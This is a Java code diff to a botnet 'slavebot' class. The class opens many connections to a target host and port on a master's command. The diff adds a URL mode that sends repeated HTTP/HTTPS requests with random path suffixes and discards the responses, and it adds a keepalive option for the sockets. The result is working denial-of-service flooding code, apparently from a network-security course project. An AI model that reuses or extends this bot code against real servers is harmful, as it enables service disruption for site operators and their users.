@@ -5,20 +5,27 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.PrintStream;
 import java.net.Socket;
+import java.net.URL;
+import java.net.URLConnection;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
+import java.util.Random;
 
 public class slavebot extends Thread {
 
 	private String targetname;
 	private int targetport;
+	private String option;
 
-	public slavebot(String targetname, int targetport) {// , boolean connection)
+	public slavebot(String targetname, int targetport, String option) {// ,
+																		// boolean
+																		// connection)
 		this.targetname = targetname;
 		this.targetport = targetport;
+		this.option = option;
 		// this.connection = connection;
 	}
 
@@ -78,14 +85,15 @@ public class slavebot extends Thread {
 			String targetIden = par.getTargetIdentifier();
 			String type = par.getTargetIdentifierType();
 			int tport = par.getTargetport();
-			// note here isConnect means connect command
+			String option = par.getOption();
+			// note here isConnect means if it is a connect command
 			boolean connect = par.isConnect();
 
 			int n = par.getRepeattimes(); // 0 means disconnect
-			
+
 			if (connect) {
 				for (int i = 0; i < n; i++) {
-					slavebot child = new slavebot(targetIden, tport);
+					slavebot child = new slavebot(targetIden, tport, option);
 					child.start();
 				}
 			} else {
@@ -103,12 +111,47 @@ public class slavebot extends Thread {
 
 	public void run() {
 		try {
+			if (option.substring(0, 4).equals("url=")) {
+				String myurlstring = "";
+				if (targetport == 80)
+					myurlstring = "http://" + targetname + option.substring(4);
+				else if (targetport == 443)
+					myurlstring = "https://" + targetname + option.substring(4);
+				else {
+					System.out.println("Wrong port.");
+					return;
+				}
+				myurlstring += generateString();
+				System.out.println("Connect with the URL " + myurlstring);
+
+				// ref:
+				// https://docs.oracle.com/javase/tutorial/networking/urls/creatingUrls.html
+				URL myurl = new URL(myurlstring);
+				URLConnection yc = myurl.openConnection();
+				BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream()));
+				String inputLine;
+				while ((inputLine = in.readLine()) != null)
+					; // just discard all stuffs returned
+						// System.out.println(inputLine);
+				System.out.println("Discard all stuffs from the server.");
+
+				in.close();
+
+				return;
+			}
+
 			// might need to use blocking queue
 			// Socket() can handle IP and name
 			Socket targetsock = new Socket(targetname, targetport);
 
+			if (option.equals("keepalive")) {
+				targetsock.setKeepAlive(true);
+				System.out.println("keepalive setted");
+			}
+
 			String connectiondate = dateFormat.format(new Date());
 
+			// add to the targetlist
 			addElement(new slave(targetsock, connectiondate));
 
 			PrintStream pstream = new PrintStream(targetsock.getOutputStream());
@@ -162,8 +205,7 @@ public class slavebot extends Thread {
 	public static void terminate(int index) {
 		synchronized (targets) {
 			try {
-				System.out.println(
-						"Try to close the connection with index " + index + ", " + targets.get(index).getName());
+				System.out.println("Try to close the connection with " + targets.get(index).getName());
 				targets.get(index).getSock().close();
 				System.out.println("Close succeed!");
 				targets.remove(index);
@@ -171,6 +213,17 @@ public class slavebot extends Thread {
 				System.out.println("Failed close connection with " + targets.get(index).getName());
 			}
 		}
+	}
+
+	public static String generateString() {
+		Random r = new Random();
+		String source = "0123456789abcdefghijklmnopqrstuvwxyz";
+		int len = r.nextInt(10);
+		char[] text = new char[len];
+		for (int i = 0; i < len; i++) {
+			text[i] = source.charAt(r.nextInt(source.length()));
+		}
+		return new String(text);
 	}
 
 }
